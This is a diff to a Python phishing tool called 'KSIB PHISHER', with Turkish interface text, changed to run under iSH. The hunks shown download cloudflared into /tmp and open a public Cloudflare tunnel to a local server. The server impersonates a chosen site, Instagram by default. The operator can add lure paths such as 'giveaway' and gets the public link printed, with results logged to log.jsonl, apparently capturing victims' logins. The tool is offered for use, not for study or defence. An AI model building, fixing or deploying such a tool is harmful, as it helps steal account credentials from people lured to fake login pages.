@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# KSIB PHISHER - PRO + DETAYLI
+# KSIB PHISHER - iSH CLOUDFLARE (CALISAN)
 import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket, re
 from http.cookies import SimpleCookie
 from urllib.parse import parse_qs, urlparse
@@ -261,29 +261,23 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         except: pass
     def log_message(self, *args): pass
 
-# ============ OTOMATIK CLOUDFLARE KURULUMU (DETAYLI) ============
+# ============ OTOMATIK CLOUDFLARE (iSH UYUMLU) ============
+
 def check_wget():
-    print("   🔍 wget kontrol ediliyor...")
     try:
         subprocess.run(["wget", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print("   ✅ wget hazir")
         return True
     except:
-        print("   ❌ wget bulunamadi!")
-        print("   💡 Çözüm: apk add wget")
         return False
 
 def check_cloudflared():
-    print("   🔍 cloudflared kontrol ediliyor...")
+    # Önce /tmp'de kontrol et (indirilmiş olabilir)
+    if os.path.exists("/tmp/cloudflared"):
+        return True
     try:
-        result = subprocess.run(["cloudflared", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        if result.returncode == 0:
-            version = result.stdout.split()[2] if len(result.stdout.split()) > 2 else "bilinmiyor"
-            print(f"   ✅ cloudflared {version} hazir")
-            return True
-        return False
+        subprocess.run(["cloudflared", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
     except:
-        print("   ❌ cloudflared bulunamadi!")
         return False
 
 def install_cloudflared():
@@ -291,31 +285,30 @@ def install_cloudflared():
     print("   ⏳ Bu islem 10-15 saniye sürebilir...")
     
     try:
-        # wget kontrol
         if not check_wget():
             print("   ❌ wget gerekli! iSH: apk add wget")
             return False
         
-        # indir
+        # iSH x86 için linux-386 kullan
         print("   ⬇️  Dosya indiriliyor...")
-        result = os.system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O /tmp/cloudflared 2>&1")
+        os.system("wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O /tmp/cloudflared 2>/dev/null")
         
-        if not os.path.exists("/tmp/cloudflared"):
-            print("   ❌ İndirme başarısız! İnternet bağlantını kontrol et.")
+        if not os.path.exists("/tmp/cloudflared") or os.path.getsize("/tmp/cloudflared") < 1000000:
+            print("   ❌ İndirme başarısız! İnternet bağlantısını kontrol et.")
             return False
         
-        # dosya boyutu kontrol
+        # dosya boyutu
         size = os.path.getsize("/tmp/cloudflared") / (1024 * 1024)
         print(f"   📦 Dosya boyutu: {size:.1f} MB")
         
-        # kurulum
-        print("   🔧 Kurulum yapiliyor...")
+        # çalıştırma izni
+        print("   🔧 İzinler ayarlaniyor...")
         os.system("chmod +x /tmp/cloudflared")
-        os.system("mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null")
         
         # test
         print("   🧪 Test ediliyor...")
-        if check_cloudflared():
+        result = subprocess.run(["/tmp/cloudflared", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if result.returncode == 0:
             print("   ✅ cloudflared başariyla kuruldu! 🎉")
             return True
         else:
@@ -330,28 +323,35 @@ def start_cloudflare_tunnel(port):
     print("🌐 CLOUDFLARE TUNNEL BASLATILIYOR")
     print("="*50)
     
-    # cloudflared kontrol
-    if not check_cloudflared():
+    # cloudflared yolunu belirle
+    cf_path = None
+    if os.path.exists("/usr/local/bin/cloudflared"):
+        cf_path = "/usr/local/bin/cloudflared"
+    elif os.path.exists("/tmp/cloudflared"):
+        cf_path = "/tmp/cloudflared"
+    
+    if not cf_path:
         print("\n   ⚠️ cloudflared bulunamadi, otomatik kurulum başlatiliyor...")
         if not install_cloudflared():
             print("\n❌ Kurulum başarisiz!")
-            print("   💡 Manuel kurulum: apk add wget")
-            print("   💡 wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm")
-            print("   💡 chmod +x cloudflared-linux-arm && mv cloudflared-linux-arm /usr/local/bin/cloudflared")
+            print("   💡 Çözüm: apk add wget")
             return None
+        cf_path = "/tmp/cloudflared"
+    
+    print(f"   ✅ cloudflared yolu: {cf_path}")
     
     try:
         print("\n   🔗 Tünel başlatiliyor...")
         print("   ⏳ Cloudflare'a bağlaniliyor (10-15 saniye)...")
         
         proc = subprocess.Popen(
-            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
+            [cf_path, "tunnel", "--url", f"http://localhost:{port}"],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True
         )
         
-        for i in range(25):
+        for i in range(30):
             time.sleep(1)
             output = proc.stderr.readline()
             if output:
@@ -384,9 +384,8 @@ def start_cloudflare_tunnel(port):
 def main():
     os.system('clear')
     print("""╔══════════════════════════════════╗
-║   🎣 KSIB PHISHER - PRO       ║
+║   🎣 KSIB PHISHER - iSH       ║
 ║   Cloudflare Tunnel           ║
-║   iSH Destekli                ║
 ║   Otomatik Kurulum            ║
 ╚══════════════════════════════════╝""")
     
@@ -398,10 +397,10 @@ def main():
             break
         print(f"❌ Hatali! Kalan hak: {2-i}")
     else: 
-        print("❌ 3 hatali deneme! Program kapaniyor.")
+        print("❌ 3 hatali deneme!")
         sys.exit(1)
 
-    print("\n🎯 HEDEF SITE SECIMI")
+    print("\n🎯 HEDEF SITE")
     print("-" * 40)
     keys = list(SITES.keys())
     for i,k in enumerate(keys,1): 
@@ -409,19 +408,18 @@ def main():
     try: 
         sec = int(input("\n> "))
         Handler.site = keys[sec-1] if 1<=sec<=len(keys) else "instagram"
-        print(f"✅ Seçilen site: {SITES[Handler.site][0]}")
+        print(f"✅ Seçilen: {SITES[Handler.site][0]}")
     except: 
         Handler.site = "instagram"
-        print("⚠️ Geçersiz seçim! Varsayilan: Instagram")
+        print("⚠️ Varsayilan: Instagram")
 
     print("\n🔗 OZEL YOL (Opsiyonel)")
     print("-" * 40)
-    print("   Örnek: 'giveaway' → site.com/giveaway")
     custom = input("   Ozel yol (bos = standart): ").strip()
     Handler.custom_path = custom if custom else ""
-    if custom: print(f"   ✅ {custom} olarak ayarlandi")
+    if custom: print(f"   ✅ {custom}")
 
-    print("\n📡 PORT AYARI")
+    print("\n📡 PORT")
     print("-" * 40)
     while True:
         try: 
@@ -436,25 +434,23 @@ def main():
         except OSError: 
             print(f"   ❌ Port {port} kullaniliyor!")
 
-    # Tunnel başlat
     tunnel_url = start_cloudflare_tunnel(port)
 
     if not tunnel_url:
         print("\n" + "="*50)
         print("❌ TUNEL BASARISIZ!")
         print("="*50)
-        print("   💡 Çözüm önerileri:")
-        print("      • İnternet bağlantısını kontrol et")
-        print("      • iSH'de: apk add wget openssh-client")
-        print("      • Tekrar dene")
+        print("   💡 Çözüm:")
+        print("      apk add wget")
+        print("      /tmp/cloudflared tunnel --url http://localhost:8080")
         sys.exit(1)
 
     print("\n" + "="*50)
-    print("✅ TUM ISLEMLER BASARILI!")
+    print("✅ BASARILI!")
     print("="*50)
     print(f"\n🌐 SITE: {SITES[Handler.site][0]}")
     print(f"🔗 LINK: {tunnel_url}")
-    if custom: print(f"🔗 OZEL LINK: {tunnel_url}/{custom}")
+    if custom: print(f"🔗 OZEL: {tunnel_url}/{custom}")
     print(f"\n📝 LOG: log.jsonl")
     print("🛑 DURDUR: Ctrl+C")
     print("\n" + "="*50)
